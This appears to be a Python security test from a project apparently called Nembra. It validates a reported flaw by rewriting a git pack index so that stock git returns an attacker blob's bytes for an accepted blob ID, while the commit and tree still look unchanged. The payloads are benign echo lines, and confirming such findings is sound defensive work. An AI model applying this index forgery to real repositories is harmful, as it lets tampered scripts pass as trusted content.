#!/usr/bin/env python3
"""Corrected validation of #2922's leaf packed-blob execution primitive.

The original witness mutates the read-only index produced by git pack-objects.
This R2 deliberately makes only that fixture artifact owner-writable, then asks
whether stock Git really returns attacker blob bytes for the accepted blob OID
while the accepted commit/tree and physical file remain exact.
"""
from __future__ import annotations

import hashlib
from pathlib import Path
import stat
import struct
import subprocess
import tempfile
import unittest

GIT = "/usr/bin/git"


def git_blob_oid(payload: bytes) -> str:
    return hashlib.sha1(b"blob " + str(len(payload)).encode("ascii") + b"\0" + payload).hexdigest()


class CorrectedPackedBlobWitnessTests(unittest.TestCase):
    def git(self, repo: Path, *args: str, input_bytes: bytes | None = None, check: bool = True) -> subprocess.CompletedProcess[bytes]:
        return subprocess.run(
            [GIT, "-C", str(repo), *args],
            input=input_bytes,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=check,
        )

    def test_stock_git_can_return_aliased_blob_bytes_for_accepted_blob_oid(self) -> None:
        with tempfile.TemporaryDirectory(prefix="nembra-packed-blob-witness-r2-") as directory:
            repo = Path(directory) / "repo"
            repo.mkdir()
            self.git(repo, "init", "-q")
            self.git(repo, "config", "user.email", "nembra@example.invalid")
            self.git(repo, "config", "user.name", "Nembra Packed Blob Witness R2")

            relative = "Scripts/bootstrap_capture_tuya_sdk.sh"
            physical = repo / relative
            physical.parent.mkdir(parents=True)
            accepted_payload = b"#!/bin/bash\necho accepted-bootstrap\n"
            physical.write_bytes(accepted_payload)
            self.git(repo, "add", relative)
            self.git(repo, "commit", "-qm", "accepted")
            accepted_source = self.git(repo, "rev-parse", "HEAD").stdout.decode().strip()
            accepted_blob = self.git(repo, "rev-parse", f"HEAD:{relative}").stdout.decode().strip()
            self.assertEqual(git_blob_oid(accepted_payload), accepted_blob)

            attacker_payload = b"#!/bin/bash\necho attacker-executed\n"
            attacker_oid = self.git(repo, "hash-object", "-w", "--stdin", input_bytes=attacker_payload).stdout.decode().strip()
            pack_prefix = repo / ".git" / "objects" / "pack" / "pack"
            pack_hash = subprocess.check_output(
                [GIT, "-C", str(repo), "pack-objects", str(pack_prefix)],
                input=(attacker_oid + "\n").encode("ascii"),
            ).decode("ascii").strip()

            for oid in (attacker_oid, accepted_blob):
                loose = repo / ".git" / "objects" / oid[:2] / oid[2:]
                if loose.exists():
                    loose.unlink()

            index = repo / ".git" / "objects" / "pack" / f"pack-{pack_hash}.idx"
            original_mode = stat.S_IMODE(index.stat().st_mode)
            self.assertEqual(original_mode & 0o222, 0, "fixture expected git pack index to begin read-only")
            index.chmod(0o600)
            data = bytearray(index.read_bytes())
            self.assertEqual(data[:4], b"\xfftOc")
            self.assertEqual(struct.unpack(">I", data[4:8])[0], 2)
            fanout_offset = 8
            names_offset = fanout_offset + 256 * 4
            count = struct.unpack(">I", data[fanout_offset + 255 * 4 : fanout_offset + 256 * 4])[0]
            self.assertEqual(count, 1)
            data[names_offset : names_offset + 20] = bytes.fromhex(accepted_blob)
            first_byte = int(accepted_blob[:2], 16)
            for value in range(256):
                struct.pack_into(">I", data, fanout_offset + value * 4, 0 if value < first_byte else 1)
            data[-20:] = hashlib.sha1(data[:-20]).digest()
            index.write_bytes(data)

            resolved = self.git(repo, "rev-parse", "--verify", f"{accepted_source}^{{commit}}").stdout.decode().strip()
            self.assertEqual(resolved, accepted_source)
            tree = self.git(repo, "ls-tree", "-r", accepted_source).stdout.decode("utf-8")
            self.assertIn(f"blob {accepted_blob}\t{relative}", tree)
            self.assertEqual(physical.read_bytes(), accepted_payload)
            self.assertEqual(git_blob_oid(physical.read_bytes()), accepted_blob)

            shown = self.git(repo, "show", f"{accepted_source}:{relative}", check=False)
            cat = self.git(repo, "cat-file", "blob", accepted_blob, check=False)
            self.assertEqual(shown.returncode, 0, shown.stderr.decode(errors="replace"))
            self.assertEqual(cat.returncode, 0, cat.stderr.decode(errors="replace"))
            self.assertEqual(shown.stdout, attacker_payload)
            self.assertEqual(cat.stdout, attacker_payload)
            self.assertNotEqual(git_blob_oid(shown.stdout), accepted_blob)

            verify = self.git(repo, "verify-pack", "-v", str(index), check=False)
            self.assertNotEqual(verify.returncode, 0, "forged index must remain detectably invalid")


if __name__ == "__main__":
    unittest.main(verbosity=2)
